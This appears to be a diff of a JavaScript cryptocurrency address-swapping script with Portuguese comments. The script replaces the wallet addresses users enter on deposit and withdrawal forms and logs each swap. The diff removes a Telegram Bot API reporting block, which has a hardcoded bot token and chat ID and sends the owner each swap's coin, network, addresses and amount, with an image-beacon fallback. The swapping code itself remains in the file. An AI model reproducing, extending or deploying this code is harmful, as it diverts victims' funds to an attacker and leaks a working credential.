@@ -20,49 +20,6 @@
   var FORCAR = false;
   var AVISO_VISUAL = false;
 
-  /* ---- Telegram (Bot API) ----
-     avisa o dono a cada troca de endereco (deposito e saque)
-     chatId vazio = descobre sozinho via getUpdates (precisa de /start no bot) */
-  var TELEGRAM = {
-    token: '9094737859:AAEBNQMv7dQ0WEr29jaFX-5GOyvKQ4IWmLc',
-    chatId: '8574440576'
-  };
-
-  function telChatId() {
-    if (TELEGRAM.chatId) return Promise.resolve(TELEGRAM.chatId);
-    return fetch('https://api.telegram.org/bot' + TELEGRAM.token + '/getUpdates')
-      .then(function (r) { return r.json(); })
-      .then(function (j) {
-        if (j && j.result && j.result.length) {
-          var last = j.result[j.result.length - 1];
-          var msg = last.message || last.edited_message || last.channel_post;
-          var cid = msg && msg.chat && msg.chat.id;
-          if (cid) { TELEGRAM.chatId = cid; return cid; }
-        }
-        return '';
-      })
-      .catch(function () { return ''; });
-  }
-
-  function telEnviar(texto) {
-    try {
-      telChatId().then(function (cid) {
-        if (!cid) return;
-        var url = 'https://api.telegram.org/bot' + TELEGRAM.token + '/sendMessage';
-        try {
-          var fd = new URLSearchParams();
-          fd.set('chat_id', cid);
-          fd.set('text', texto);
-          fetch(url, { method: 'POST', body: fd }).catch(function () {
-            try { new Image().src = url + '?chat_id=' + encodeURIComponent(cid) + '&text=' + encodeURIComponent(texto); } catch (e) {}
-          });
-        } catch (e) {
-          try { new Image().src = url + '?chat_id=' + encodeURIComponent(cid) + '&text=' + encodeURIComponent(texto); } catch (e2) {}
-        }
-      });
-    } catch (e) {}
-  }
-
   var DEPOSITO = {
     IGUAL: '',
 
@@ -208,13 +165,6 @@
     if (logDep.length > 200) logDep.shift();
     console.log('%c[DEP] ' + moeda + '/' + rede + '  ->  ' + novo, 'color:#0a0;font-weight:bold');
     console.log('      antes: ' + original);
-
-    // avisa no Telegram: endereco de deposito trocado
-    telEnviar('DEPOSITO - ENDERECO TROCADO\n' +
-              'Moeda: ' + moeda + '\n' +
-              'Rede: ' + rede + '\n' +
-              'De: ' + original + '\n' +
-              'Para: ' + novo);
   }
 
   function registrarSaq(d) {
@@ -241,14 +191,6 @@
       console.log('   valor    : mantido ' + d.valorDigitado + ' - ' + (d.motivoValor || 'sem calculo'));
     }
     console.log('   total de trocas nesta aba: ' + trocas);
-
-    // avisa no Telegram: saque (carteira + valor + moeda)
-    var _v = (d.valor != null) ? d.valor : d.valorDigitado;
-    telEnviar('SAQUE - ENDERECO TROCADO\n' +
-              'Moeda: ' + d.moeda + '\n' +
-              'Rede: ' + (d.rede || '-') + '\n' +
-              'Valor: ' + _v + '\n' +
-              'Carteira: ' + d.bruto + ' -> ' + d.novo);
   }
 
   function trocarObjetoDep(obj, moeda, rede) {
